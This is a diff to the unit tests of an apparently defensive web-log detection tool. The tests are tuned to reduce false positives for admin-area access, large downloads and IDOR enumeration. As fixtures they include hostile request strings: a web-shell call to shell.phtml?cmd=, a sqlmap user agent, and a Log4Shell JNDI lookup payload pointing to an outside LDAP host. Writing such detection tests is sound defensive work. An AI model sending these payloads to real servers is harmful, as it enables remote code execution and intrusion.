@@ -216,9 +216,42 @@ class NewRuleTests(unittest.TestCase):
     def test_default_admin_login_then_export_is_access_and_exfil(self):
         lines = ('198.51.100.9 - - [10/Oct/2026:13:55:36 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "-" "x"\n'
                  '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /admin/members.php HTTP/1.1" 200 120000 "-" "x"')
+        # 관리자 IP를 프로필에 적었으면, 그 밖에서 로그인해 대량으로 내려받은 것을 잡는다(도난 계정)
+        p = SiteProfile(trusted_ips=["192.0.2.10/32"])
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), p)}
+        self.assertIn("WEBLOG_ADMIN_ACCESS", rules)
+        self.assertIn("WEBLOG_LARGE_EXFIL", rules)
+        # 적지 않았어도 인터넷(공인 IP)에서 들어온 것은 잡는다
         rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
         self.assertIn("WEBLOG_ADMIN_ACCESS", rules)
         self.assertIn("WEBLOG_LARGE_EXFIL", rules)
+
+    def test_internal_admin_without_trusted_ips_is_quiet(self):
+        # 관리자 IP를 적지 않은 사이트에서 내부망 관리자가 관리 화면을 쓰는 것은 알리지 않는다
+        lines = ('10.0.5.7 - - [10/Oct/2026:13:55:36 +0000] "POST /wp-login.php HTTP/1.1" 302 0 "-" "x"\n'
+                 '10.0.5.7 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-admin/post-new.php HTTP/1.1" 200 120000 "-" "x"')
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        self.assertFalse(rules & {"WEBLOG_ADMIN_ACCESS", "WEBLOG_LARGE_EXFIL"})
+        # 관리자 IP를 적었으면 그 밖의 내부망 IP도 알린다
+        p = SiteProfile(trusted_ips=["10.0.9.0/24"])
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), p)}
+        self.assertIn("WEBLOG_ADMIN_ACCESS", rules)
+
+    def test_admin_access_with_other_signal_without_trusted_ips(self):
+        # 내부망 IP라도 같은 IP가 스캐너로도 잡히면 관리자 영역 접근도 알린다
+        lines = ('10.0.5.8 - - [10/Oct/2026:13:55:30 +0000] "GET / HTTP/1.1" 200 10 "-" "sqlmap/1.7"\n'
+                 '10.0.5.8 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-admin/edit.php HTTP/1.1" 200 900 "-" "x"')
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        self.assertIn("WEBLOG_ADMIN_ACCESS", rules)
+
+    def test_wordpress_asset_loaders_are_not_admin_area(self):
+        # load-scripts.php·load-styles.php는 관리자 화면이 부르는 CSS·JS 묶음이다(정적 파일과 같게 본다)
+        for page in ("load-scripts.php", "load-styles.php"):
+            line = (f'198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-admin/{page}?load=x HTTP/1.1" '
+                    f'200 90000 "-" "x"')
+            p = SiteProfile(trusted_ips=["192.0.2.10/32"])
+            rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line), p)}
+            self.assertFalse(rules & {"WEBLOG_ADMIN_ACCESS", "WEBLOG_LARGE_EXFIL"}, page)
 
     def test_phtml_upload_is_exec(self):
         line = acc(q="").replace("/search.php?q=", "/uploads/shell.phtml?cmd=")
@@ -270,8 +303,31 @@ class ExternalChainTests(unittest.TestCase):
         lines = "\n".join(
             f'198.51.100.9 - - [10/Oct/2026:13:55:{i:02d} +0000] "GET /order.php?id={i} HTTP/1.1" 200 300 "-" "x"'
             for i in range(1, 13))
-        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        rules = {f.rule for f in webdetect.run_web_detections(
+            weblog.parse_access(lines), SiteProfile(private_object_paths=["/order.php"]))}
         self.assertIn("WEBLOG_IDOR_ENUM", rules)
+        # 경로를 프로필에 적지 않으면 끈다(상품 목록 넘겨 보기와 구별할 수 없음)
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        self.assertNotIn("WEBLOG_IDOR_ENUM", rules)
+
+    def test_idor_route_pattern(self):
+        lines = "\n".join(
+            f'198.51.100.9 - - [10/Oct/2026:13:55:{i:02d} +0000] "GET /api/orders/{1000 + i} HTTP/1.1" 200 300 "-" "x"'
+            for i in range(10))
+        prof = SiteProfile(private_object_paths=["/api/orders/{id}"])
+        fs = [f for f in webdetect.run_web_detections(weblog.parse_access(lines), prof) if f.rule == "WEBLOG_IDOR_ENUM"]
+        self.assertEqual(len(fs), 1)
+        self.assertIn("/api/orders/{id}", fs[0].detail)
+
+    def test_wp_admin_is_admin_area(self):
+        # 예전에는 /admin으로 시작하는 경로만 관리자 영역으로 봐서 /wp-admin 접근을 놓쳤다
+        line = '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-admin/users.php HTTP/1.1" 200 900 "-" "x"'
+        self.assertIn("WEBLOG_ADMIN_ACCESS", self._rules(line, SiteProfile()))
+        login = '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-login.php HTTP/1.1" 200 900 "-" "x"'
+        self.assertNotIn("WEBLOG_ADMIN_ACCESS", self._rules(login, SiteProfile()))  # 로그인 화면은 아님
+        # 방문자 브라우저가 늘 부르는 WordPress AJAX 창구는 관리자 접근이 아니다(AIT 측정의 오탐 475줄)
+        ajax = '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 90 "-" "x"'
+        self.assertNotIn("WEBLOG_ADMIN_ACCESS", self._rules(ajax, SiteProfile()))
 
     def test_probe_strings_in_user_agent(self):
         self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="${jndi:ldap://198.51.100.99/a}")))
